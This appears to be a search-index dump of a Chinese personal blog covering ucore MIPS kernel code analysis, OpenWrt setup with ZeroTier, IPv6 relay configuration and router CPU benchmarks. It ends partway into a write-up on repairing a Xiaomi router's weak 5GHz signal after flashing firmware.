<p>\u6267\u884cswitch_to\uff0ckernel_thread\u8bbe\u7f6e\u4e86context\u4e2d\u7684sp, ra\u3002\u6267\u884cjr ra\u540e\uff0c\u8df3\u8f6c\u5230forkret</p> </li> </ol> <pre><code>// forkret -- the first kernel entry point of a new thread/process\n// NOTE: the addr of forkret is setted in copy_thread function\n//       after switch_to, the current proc will execute here.\nstatic void\nforkret(void) {\n    forkrets(current-&gt;tf);\n}\n\nforkrets:\n  addiu sp, a0, -16\n  b exception_return\n  nop\n</code></pre> <ol> <li> <p>forkrets-&gt;exception_return\u4ece\u4e2d\u65ad\u8fd4\u56de\uff0c\u5f39\u51fa\u4e2d\u65ad\u5e27tf\u3002CPU\u4fbf\u4f1a\u8fdb\u5165kernel_thread_entry\uff0c\u5e76\u4ee5tf\u4e2d\u6307\u5b9a\u7684\u5bc4\u5b58\u5668\u503c\u6267\u884c</p> </li> <li> <p>kernel_thread_entry\u8df3\u8f6c\u6267\u884c$a1\u5373init_main</p> </li> </ol> <pre><code>//kern/proc/entry.S\nkernel_thread_entry:        # void kernel_thread(void)\n  addiu $sp, $sp, -16\n  jal $a1\n  nop\n  move $a0, $v0\n  la  $t0, do_exit\n  jal $t0 \n  nop\n  /* never here */\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#user_main\u7684\u6267\u884c\u8fc7\u7a0b","title":"user_main\u7684\u6267\u884c\u8fc7\u7a0b","text":"<ol> <li>\u5728init_main\u4e2d\uff0c\u521b\u5efa\u4e86user_main\u7ebf\u7a0b\u3002\u7136\u540einit_main\u6267\u884cdo_wait</li> </ol> <pre><code>// init_main - the second kernel thread used to create user_main kernel threads\nstatic int\ninit_main(void *arg) {\n ...\n    int pid = kernel_thread(user_main, NULL, 0);\n    if (pid &lt;= 0) {\n        panic(\"create user_main failed.\\n\");\n    }\n\n    while (do_wait(0, NULL) == 0) {\n        schedule();\n    }\n\n    fs_cleanup();\n    kprintf(\"all user-mode processes have quit.\\n\");\n    ...\n}\n</code></pre> <ol> <li>do_wait\u7684\u4f5c\u7528\u662f\u7b49\u5f85\u6307\u5b9a\u7684\u6216\u8005\u4efb\u610f\u4e00\u4e2a\uff08\u4f20\u5165\u7684pid\u4e3a0\uff09\u5b50\u7ebf\u7a0b\u8fdb\u5165ZOMBIE\u72b6\u6001\uff0c\u91ca\u653e\u5b50\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u7a7a\u95f4\u548cPCB\u7a7a\u95f4\u3002\u5426\u5219\uff0c\u81ea\u5df1\u8fdb\u5165\u7761\u7720\u72b6\u6001SLEEPING\uff0c\u7136\u540e\u8c03\u7528schedule()\u3002</li> </ol> <pre><code>// do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack\n//         - proc struct of this child.\n// NOTE: only after do_wait function, all resources of the child proces are free.\nint\ndo_wait(int pid, int *code_store)\n</code></pre> <ol> <li> <p>schedule\u8c03\u7528\u5230user_main\u7ebf\u7a0b\u3002\u548cinit\u4e00\u6837\uff0c\u6267\u884c\u5230user_main\u51fd\u6570\u3002</p> </li> <li> <p>user_main\u51fd\u6570\u8c03\u7528\u4e86kernel_execv\u51fd\u6570\uff0c\u5b9e\u8d28\u4e3a\u4e00\u6b21SYS_exec\u7cfb\u7edf\u8c03\u7528\u3002</p> </li> <li> <p>\u6700\u540e\u91cd\u65b0\u5206\u914d\u5185\u6838\u548c\u7528\u6237\u7a7a\u95f4\uff0c\u52a0\u8f7d\u4e86sh\u7528\u6237\u7a0b\u5e8f\u3002user_main\u7ebf\u7a0b\u4ece\u5185\u6838\u7ebf\u7a0b\u53d8\u4e3a\u7528\u6237\u7ebf\u7a0b\u3002</p> </li> <li> <p>\u7528\u6237\u8fdb\u7a0b\u94fe\u63a5\u811a\u672cuser.ld\u6307\u5b9a\u4e86ENTRY(_start)\u3002_start\u5728user/libs/initcode.S\u4e2d\u5b9a\u4e49\u3002</p> </li> </ol> <pre><code>_start:\n    nop\n    la $gp, _gp\n    addiu $sp, $sp, -16\n    jal umain\n    nop\n</code></pre> <p>umain\u5728user/libs/umain.c\u4e2d\u5b9a\u4e49</p> <pre><code>void\numain(int argc, char *argv[]) {\n    int fd;\n    if ((fd = initfd(0, \"stdin:\", O_RDONLY)) &lt; 0) {\n        warn(\"open &lt;stdin&gt; failed: %e.\\n\", fd);\n    }\n    if ((fd = initfd(1, \"stdout:\", O_WRONLY)) &lt; 0) {\n        warn(\"open &lt;stdout&gt; failed: %e.\\n\", fd);\n    }\n    int ret = main(argc, argv);\n    exit(ret);\n}\n</code></pre>","tags":["ucore","mips"]},{"location":"%E8%AF%BE%E7%A8%8B/2021/04/06/2021-04-06-ucore-mips-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/#ide_init--fs_init","title":"ide_init &amp; fs_init","text":"","tags":["ucore","mips"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/","title":"Openwrt\u6298\u817e","text":"<ul> <li>\u79fb\u52a8\u5bbd\u5e26\u5f00\u542fipv6</li> <li>Openwrt\u5b89\u88c5ZeroTier</li> <li>Openwrt\u914d\u7f6eipv6</li> <li>CPU\u6027\u80fd\u6d4b\u8bd5</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u79fb\u52a8\u5bbd\u5e26\u5f00\u542fipv6","title":"\u79fb\u52a8\u5bbd\u5e26\u5f00\u542fipv6","text":"<ol> <li>\u79fb\u52a8\u5149\u732b\u4f7f\u7528\u6865\u63a5\u6a21\u5f0f + \u8def\u7531\u5668\u4f7f\u7528\u62e8\u53f7\u4e0a\u7f51</li> <li> <p>\u79fb\u52a8\u5149\u732b\u5f00\u542fipv6\u6b65\u9aa4</p> </li> <li> <p>\u5220\u9664\u539f\u672cipv4\u7684PPPoE</p> </li> <li>\u534f\u8bae\u9009\u62e9ipv4/ipv6\uff0c\u521b\u5efa\u65b0\u7684PPP\u8fde\u63a5</li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#openwrt\u5b89\u88c5zerotier","title":"Openwrt\u5b89\u88c5ZeroTier","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u4f5c\u7528","title":"\u4f5c\u7528","text":"<ol> <li>\u5c06\u82e5\u5e72\u4e2a\u5b89\u88c5\u4e86Zerotier\u7684\u8bbe\u5907\u6dfb\u52a0\u5230\u4e00\u4e2a\u5927\u5c40\u57df\u7f51\u4e2d\u4e92\u76f8\u8bbf\u95ee</li> <li>\u5728Zerotier\u4e2d\u8bbe\u7f6eRoute\uff0c\u4ece\u800c\u5b9e\u73b0\u8bbf\u95eeopenwrt\u8bbe\u5907\u5c40\u57df\u7f51\u4e2d\u7684\u5176\u5b83\u8bbe\u5907</li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u76f8\u5173\u6559\u7a0b","title":"\u76f8\u5173\u6559\u7a0b","text":"<ol> <li> <p>openwrt\u5b98\u65b919.07.3\u56fa\u4ef6\u4f7f\u7528zerotier\u7684\u914d\u7f6e\u8fc7\u7a0b - OPENWRT\u4e13\u7248 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> </li> <li> <p>https://www.bilibili.com/video/BV1hT4y1E78k</p> </li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u5177\u4f53\u8fc7\u7a0b","title":"\u5177\u4f53\u8fc7\u7a0b","text":"<ol> <li> <p>\u53bbZeroTier\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\uff0c\u5e76\u4e86\u89e3ZeroTier\u7684\u4f7f\u7528</p> </li> <li> <p>\u5b89\u88c5zerotier</p> </li> </ol> <pre><code>opkg update\nopkg install zerotier\n</code></pre> <p>\u8fd9\u91cc\u4f1a\u4f9d\u8d56kmod-tun\u7b49\u5185\u6838\u6a21\u5757\uff0c\u8fd9\u8981\u6c42\u5185\u6838\u7248\u672c\u5b8c\u5168\u4e00\u81f4\u624d\u80fd\u5b89\u88c5\u6210\u529f\u3002openwrt\u5f00\u53d1\u7248\u672c(snapshot)\u6bcf\u5929\u3001\u751a\u81f3\u51e0\u4e2a\u5c0f\u65f6\u5c31\u4f1a\u66f4\u65b0\uff0c\u56e0\u6b64\u5f88\u6709\u53ef\u80fd\u56e0\u4e3a\u6709\u4e86\u65b0\u7684\u66f4\u65b0\uff0c\u5bfc\u81f4opkg\u4e0b\u8f7d\u7684kmod-tun\u5185\u6838\u7248\u672c\u4e0d\u4e00\u81f4\u5bfc\u81f4\u62a5\u9519\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u66f4\u65b0\u4e3a\u65b0\u7248\u7684\u5f00\u53d1\u7248\uff0c\u5e76\u5c3d\u5feb\u4e0b\u8f7d\u5b89\u88c5\u3002\u5bf9\u4e8estable\u7248\u672c\uff0c\u5b98\u65b9\u6e90\u4fdd\u8bc1\u4e86\u4e00\u81f4\u6027\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\u3002</p> <ol> <li>\u914d\u7f6eZeroTier</li> </ol> <pre><code>mkdir -p /etc/zerotier\nuci set zerotier.openwrt_network=zerotier\nuci add_list zerotier.openwrt_network.join='\u4f60\u7684\u7f51\u7edcID'\nuci set zerotier.openwrt_network.enabled='1'\nuci set zerotier.openwrt_network.config_path='/etc/zerotier'\nuci commit zerotier\n</code></pre> <ol> <li>\u542f\u52a8zerotier\uff08\u6b64\u65f6\u5df2\u7ecf\u53ef\u4ee5\u4eceZeroTier Central\u4e2d\u770b\u5230\u8def\u7531\u5668\u8fde\u4e0a\u4e86\uff09</li> </ol> <pre><code>/etc/init.d/zerotier enable\n/etc/init.d/zerotier start\n</code></pre> <ol> <li>\u521b\u5efa\u63a5\u53e3</li> </ol> <p>web\u754c\u9762\uff0c\u7f51\u7edc -&gt; \u63a5\u53e3\uff0c\u6dfb\u52a0\u65b0\u63a5\u53e3    \u540d\u79f0 ZeroTier    \u534f\u8bae\u9009\u9759\u6001\u534f\u8bae\uff0cip\u8bbe\u7f6e\u4e3aZeroTier Central\u4e2d\u7684ip    \u63a5\u53e3\u9009z\u5f00\u5934\u7684\u9002\u914d\u5668    \u521b\u5efa/\u5206\u914d\u9632\u706b\u5899\u533a\u57df\u9009\u62e9lan    \u4fdd\u5b58&amp;\u5e94\u7528</p> <ol> <li>\u9632\u706b\u5899</li> </ol> <p>\u5168\u90e8\u8bbe\u7f6e\u6210allow</p> <p></p> <ol> <li>ZeroTier Central\u914d\u7f6e\u8def\u7531\u8f6c\u53d1</li> </ol> <p>\u914d\u7f6e\u8fd9\u4e2a\u540e\uff0c\u5728\u5916\u7f51\u53ef\u4ee5\u901a\u8fc7\u5c40\u57df\u7f51ip\u76f4\u63a5\u8bbf\u95ee\u4e0d\u5728ZeroTier Central\u4e2d\u7684\u5176\u5b83\u5c40\u57df\u7f51\u8bbe\u5907\u3002\uff08\u8fc7\u7a0b\u5927\u81f4\u662f\uff1a\u5916\u7f51 -&gt; zerotier -&gt; \u5c40\u57df\u7f51\u4e00\u53f0\u8bbe\u5907(\u4f4d\u4e8eZeroTier\u4e2d) -&gt; \u5c40\u57df\u7f51\u5176\u5b83\u8bbe\u5907\uff09</p> <p>\u6ce8\u610f\uff1a\u522b\u5c06\u7b2c\u4e00\u884c\u7684\u5220\u4e86\uff0c\u5426\u5219\u5168\u90e8\u65e0\u6cd5\u8bbf\u95ee</p> <p>\u7f3a\u70b9\uff1a\u76ee\u524d\u53d1\u73b0\uff0c\u5f53\u4e24\u53f0\u7535\u8111\u4f4d\u4e8e\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u60f3\u8981\u76f4\u63a5\u901a\u8fc7\u5c40\u57df\u7f51ip\u8bbf\u95ee\u65f6\uff0c\u5373\u4f7f\u6ca1\u6709\u5f00\u542fzerotier\u8f6f\u4ef6\uff0c\u4e24\u53f0\u7535\u8111\u7684\u76f8\u4e92\u8bbf\u95ee\u901f\u5ea6\u4e5f\u4f1a\u4e25\u91cd\u53d7\u9650\uff08\u539f\u672c\u53ef\u4ee5\u8dd1\u5230500M\uff0c\u76f4\u63a5\u964d\u4e3a10M\uff09</p> <p>\u914d\u7f6e\u56fe\uff1a\u8bbf\u95ee192.168.31.*\u4e2d\u7684\u8bbe\u5907\u65f6\uff0c\u4f1a\u901a\u8fc7192.168.192.168(\u5b9e\u9645\u5c40\u57df\u7f51ip\u4e3a\u8def\u7531\u5668)\u8bbf\u95ee</p> <p></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#openwrt\u914d\u7f6eipv6","title":"Openwrt\u914d\u7f6eipv6","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u5b89\u88c5\u597dopenwrt(21.02)\u540e\uff0c\u4f1a\u9ed8\u8ba4\u5f00\u542f\u5e76\u914d\u7f6eipv6\uff0c\u7535\u8111\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95eeipv6\u3002\u4f46\u662f\u8be5\u65b9\u5f0f\u53ea\u6709\u8def\u7531\u5668\u80fd\u5f97\u5230\u4e00\u4e2a\u516c\u7f51ipv6\u5730\u5740\uff0c\u8def\u7531\u5668\u5c40\u57df\u7f51\u5185\u8bbe\u5907\u53ea\u6709\u672c\u5730ipv6\u5730\u5740\u3002\u7c7b\u4f3c\u4e8eOpenwrt\u5f00\u542f\u4e86\u4e00\u5c42ipv6\u7684NAT\u3002\u800c\u4e3a\u4e86\u8ba9\u8fde\u4e0a\u8def\u7531\u5668\u7684\u6240\u6709\u8bbe\u5907\u83b7\u5f97\u516c\u7f51ipv6\u5730\u5740\uff0c\u9700\u8981\u8fdb\u884c\u4ee5\u4e0b\u8bbe\u7f6e</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u7406\u8bba","title":"\u7406\u8bba","text":"<p>https://www.bilibili.com/video/BV1Lb4y197wD</p> <p>https://www.bilibili.com/video/BV15K4y1W74Q</p> <ul> <li>RA(router advertisement)\uff1a\u8def\u7531\u5668\u901a\u544a\uff0c\u901a\u8fc7\u5e7f\u64ad\u8be5\u4fe1\u606f\uff0c\u7ed9\u8bbe\u5907\u5206\u914dipv6\u5730\u5740</li> <li>SLAAC(Stateless Address Autoconfiguration)\uff1a\u65e0\u72b6\u6001\u7684\u5730\u5740\u81ea\u52a8\u914d\u7f6e\u534f\u8bae\u3002\u4f7f\u7528RA\u8fdb\u884c\u5730\u5740\u914d\u7f6e\uff0c\u7279\u70b9\u662f\u65e0\u72b6\u6001\u7684\u3002DHCPv6\u5219\u662f\u6709\u72b6\u6001\u7684\u3002\u76ee\u524d\u4f1a\u6df7\u5408\u4f7f\u7528\u8fd9\u4e24\u4e2a\u534f\u8bae\u6765\u914d\u7f6eipv6\u3002</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"<p>\u53ef\u4ee5\u901a\u8fc7luci\u6765\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539/etc/config/dhcp\u6587\u4ef6\u6765\u914d\u7f6e</p> <p>\u4fee\u6539dhcp\u6d89\u53caipv6\u90e8\u5206\u4e3a\u4ee5\u4e0b\u914d\u7f6e\u5373\u53ef\uff08\u5176\u4e2dwan6\u90e8\u5206\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u6dfb\u52a0\uff09</p> <pre><code>config dhcp 'lan'\n        option interface 'lan'\n        option start '100'\n        option limit '150'\n        option leasetime '12h'\n        option dhcpv4 'server'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        list ra_flags 'none'\n\nconfig dhcp 'wan'\n        option interface 'wan'\n        option ignore '1'\n\nconfig dhcp 'wan6'\n        option interface 'wan'\n        option ra 'relay'\n        option dhcpv6 'relay'\n        option ndp 'relay'\n        option master '1'\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#cpu\u6027\u80fd\u6d4b\u8bd5","title":"CPU\u6027\u80fd\u6d4b\u8bd5","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#simple-md5","title":"simple md5","text":"<p>Router CPU performance - rm's homepage (romanrm.net)</p> <ul> <li>mt7621</li> <li>mi4a: 20MB/s</li> <li>a53</li> <li>ax6s: 117.64MB/s</li> <li>rk3399: 200MB/s</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#openssl","title":"openssl","text":"<p>[OpenWrt Wiki] OpenSSL benchmarks rk3399 <pre><code>version: 3.0.2\nbuilt on: Wed May 24 17:12:55 2023 UTC\noptions: bn(64,64)\ncompiler: gcc -fPIC -pthread -Wa,--noexecstack -Wall -Wa,--noexecstack -g -O2 -ffile-prefix-map=/build/openssl-7eq86f/openssl-3.0.2=. -flto=auto -ffat-lto-objects -flto=auto -ffat-lto-objects -fstack-protector-strong -Wformat -Werror=format-security -DOPENSSL_TLS_SECURITY_LEVEL=2 -DOPENSSL_USE_NODELETE -DOPENSSL_PIC -DOPENSSL_BUILDING_OPENSSL -DNDEBUG -Wdate-time -D_FORTIFY_SOURCE=2\nCPUINFO: OPENSSL_armcap=0xbf\nThe 'numbers' are in 1000s of bytes per second processed.\ntype             16 bytes     64 bytes    256 bytes   1024 bytes   8192 bytes  16384 bytes\nmd5              25117.29k    75388.93k   170339.41k   248440.15k   286692.69k   289434.28k\nsha1             32326.83k   115190.76k   344452.95k   685736.96k   955422.04k   986294.95k\nsha256           30650.33k   109581.03k   322119.25k   619945.64k   852036.27k   871251.97k\nsha512           16066.74k    64347.97k   126085.80k   200046.93k   241947.99k   245028.18k\ndes-cbc              0.00         0.00         0.00         0.00         0.00         0.00\ndes-ede3         14249.92k    14731.20k    14853.12k    14884.86k    14893.06k    14893.06k\naes-128-cbc     404753.72k   850053.44k  1183380.39k  1294449.32k  1352469.16k  1352548.35k\naes-192-cbc     368863.90k   780227.81k  1056115.03k  1146200.75k  1192258.22k  1190625.28k\naes-256-cbc     359750.67k   697077.50k   883295.91k   988094.81k  1022683.82k  1021962.92k\n                  sign    verify    sign/s verify/s\nrsa 2048 bits 0.004963s 0.000132s    201.5   7580.0\n                  sign    verify    sign/s verify/s\ndsa 2048 bits 0.001820s 0.001724s    549.3    580.1\nawk: not an option: -e\nawk: not an option: -e\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/09/17/2021-09-17-Openwrt%E6%8A%98%E8%85%BE/#coremark","title":"coremark","text":"<p>coremark\u662f\u4e00\u4e2a\u5e38\u7528\u7684\u6d4b\u8bd5MCU\u6027\u80fd\u7684\u8dd1\u5206\u7a0b\u5e8f\u3002\u5728openwrt\u4e0a\u5b89\u88c5\u4e86gcc, make\u540e\uff0c\u53ef\u4ee5\u5728openwrt\u4e0a\u7f16\u8bd1\u5e76\u8fd0\u884c\u3002 \u7f16\u8bd1\u65f6\u6ce8\u610f\uff1amake NO_LIBRT=1</p> <p>rk3399 <pre><code>2K performance run parameters for coremark.\nCoreMark Size    : 666\nTotal ticks      : 20173\nTotal time (secs): 20.173000\nIterations/Sec   : 9914.241808\nIterations       : 200000\nCompiler version : GCC11.3.0\nCompiler flags   : -O2 -DPERFORMANCE_RUN=1  -lrt\nMemory location  : Please put data memory location here\n                        (e.g. code in flash, data on heap etc)\nseedcrc          : 0xe9f5\n[0]crclist       : 0xe714\n[0]crcmatrix     : 0x1fd7\n[0]crcstate      : 0x8e3a\n[0]crcfinal      : 0x4983\nCorrect operation validated. See README.md for run and reporting rules.\nCoreMark 1.0 : 9914.241808 / GCC11.3.0 -O2 -DPERFORMANCE_RUN=1  -lrt / Heap\n</code></pre></p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/","title":"\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b","text":"","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u524d\u8a00","title":"\u524d\u8a00","text":"<p>\u8d77\u56e0\u662f\u60f3\u5728openwrt\u4e0a\u88c5\u4e0aopenclash\u63d2\u4ef6\uff0c\u4f46\u8def\u7531\u5668\u7a7a\u95f4\u4e0d\u591f\u4e86\uff08\u8def\u7531\u5668\u4e3ami4a\u5343\u5146\u7248\uff0c\u6709\u4e00\u4e2a16M\u7684NOR flash\u3002\u901a\u8fc7\u5728\u7f16\u8bd1\u65f6\u8bbe\u7f6e\u5757\u5927\u5c0f\u4e3a512KB\uff0c\u6210\u529f\u5b89\u88c5\u4e86<code>zerotier</code>,<code>wireguard</code>,<code>python</code>\u7b49\u8f6f\u4ef6\uff0c\u7f16\u8bd1\u7684\u955c\u50cf\u5927\u5c0f\u4e3a13,894,754 B\uff09\uff0c\u56e0\u6b64\u53c2\u8003\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Saving firmware space and RAM\uff0c\u5728\u7f16\u8bd1\u65f6\u5173\u95ed\u4e86\u4e00\u4e9b\u5185\u6838\u76f8\u5173\u7684\u9009\u9879\uff0c\u5e76\u5c06\u5757\u5927\u5c0f\u8bbe\u7f6e\u4e3a\u4e861MB\u3002\u6700\u540e\u6210\u529f\u751f\u6210\u955c\u50cf\uff0c\u5927\u5c0f\u4e3a14,943,330 B\u3002</p> <p>\u53ef\u6ca1\u60f3\u5230\u5728\u66f4\u65b0\u7cfb\u7edf\u540e\u8def\u7531\u5668\u65e0\u6cd5\u6b63\u786e\u542f\u52a8\uff0c\u4e8e\u662f\u9700\u8981\u5148\u4f7f\u7528\u5c0f\u7c73\u5b98\u65b9\u5de5\u5177\u6062\u590d\uff0c\u7136\u540e\u518d\u91cd\u5237openwrt\u7cfb\u7edf\u3002\u4f46\u8003\u8651\u5230\u4e4b\u540e\u5982\u679c\u8981\u591a\u6b21\u5c1d\u8bd5\u7684\u8bdd\uff0c\u6bcf\u6b21\u5931\u8d25\u90fd\u9700\u8981\u5148\u6062\u590d\u5b98\u65b9\u7cfb\u7edf\u7136\u540e\u91cd\u65b0\u5237\u6bd4\u8f83\u9ebb\u70e6\u3002\u4e8e\u662f\u8fd9\u4e00\u6b21\u91cd\u88c5\uff0c\u6211\u9009\u62e9\u4e86\u5237breed\u5f15\u5bfc\u7a0b\u5e8f\u3002\u8fd9\u6837\uff0c\u4e0b\u6b21\u5237\u5931\u8d25\u540e\u4fbf\u53ef\u4ee5\u901a\u8fc7breed\u76f4\u63a5\u91cd\u5237\u56fa\u4ef6\u3002</p> <p>\u7136\u800c\uff0c\u4e0d\u77e5\u662f\u5426\u662f\u56e0\u4e3a\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u5931\u8bef\uff0c\u6211\u4f7f\u7528breed\u5237openwrt\u4f1a\u5931\u8d25\uff0c\u8def\u7531\u5668\u4f1a\u65e0\u9650\u91cd\u542f\u3002\u5e76\u4e14\u5728\u5237\u56de\u5b98\u65b9\u56fa\u4ef6\u540e\uff0c\u751a\u81f3\u65e0\u6cd5\u4e0a\u7f51\u3002\u6700\u540e\uff0c\u6211\u4ece\u539f\u5382\u56fa\u4ef6\u76f4\u63a5\u5237\u56de\u4e86openwrt\uff0c\u4f46\u662f\u5374\u53d1\u73b0openwrt\u4e2d\u76845GHz\u7684\u65e0\u7ebf\u6700\u5927\u53d1\u5c04\u529f\u7387(Maximum transmit power)\u5c45\u7136\u53d8\u4e3a\u4e861mW(3dBm)\uff0c\u8fd9\u5bfc\u81f4\u8def\u7531\u5668\u76845G\u4fe1\u53f7\u975e\u5e38\u5f31\uff0c\u5373\u4f7f\u662f1m\u7684\u8ddd\u79bb\uff0c\u4fe1\u53f7\u4e5f\u5f88\u5f31\u3002\u4e8e\u662f\u6211\u5404\u79cd\u5c1d\u8bd5\u53bb\u4fee\u590d\u8fd9\u4e2a\u95ee\u9898\uff0c\u4ee5\u4e0b\u662f\u8bb0\u5f55\u7684\u8fc7\u7a0b\u3002</p>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u8bf4\u660e","title":"\u8bf4\u660e","text":"<p>\u53ef\u80fd\u9700\u8981\u4e86\u89e3mi4a\u7684\u5237\u673a\u8fc7\u7a0b\uff0c\u5b98\u65b9\u6551\u7816\u5de5\u5177</p>","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u8fc7\u7a0b","title":"\u8fc7\u7a0b","text":"","tags":["openwrt","breed","flash\u5206\u533a","EEPROM"]},{"location":"%E6%8A%98%E8%85%BE/2021/10/17/2021-10-17-%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8%E5%88%B7%E5%87%BA%E9%97%AE%E9%A2%98%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7b2c\u4e00\u6b21\u5c1d\u8bd5","title":"\u7b2c\u4e00\u6b21\u5c1d\u8bd5","text":"<p>\u5728\u67d0\u6b21\u8fd0\u884c<code>OpenWRTInvasion</code>\u811a\u672c\u65f6\uff0c\u5207\u6362\u4e86\u4e0b\u7f51\u7edc\uff0c\u5bfc\u81f4\u8be5\u6b21\u8fd0\u884c\u5931\u8d25\uff0c\u53ef\u80fd\u5bfc\u81f4\u4ece\u672c\u5730\u4e0b\u8f7dbusybox-mipsel\u51fa\u9519\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u540e\u6765\u7684\u9519\u8bef\u3002\u5728\u540e\u9762\u7684\u6bcf\u4e00\u6b21\u901a\u8fc7\u5b98\u65b9\u5de5\u5177\u91cd\u5237\u540e\uff0c\u521d\u59cb\u8bbe\u7f6e\u65f6\u7684\u81ea\u52a8\u68c0\u6d4b\u4e0a\u7f51\u73af\u5883\u65e0\u6cd5\u68c0\u6d4b\u6210\u529f\u3002\u5e76\u4e14\uff0c\u8def\u7531\u5668\u7f51\u7edc\u51fa\u73b0\u95ee\u9898\uff0c\u6d4b\u901f\u7ed3\u679c\u4e5f\u5f88\u4e0d\u6b63\u5e38\u3002\u5982\u56fe\u6240\u793a\u3002</p> <p></p> <p></p> <p>\u6b64\u65f6\u6211\u5728\u7f51\u4e0a\u4e5f\u641c\u7d22\u5230EEPROM\u9519\u8bef\u53ef\u80fd\u5bfc\u81f4\u65e0\u7ebf\u7f51\u7edc\u7684\u95ee\u9898\u3002</p> 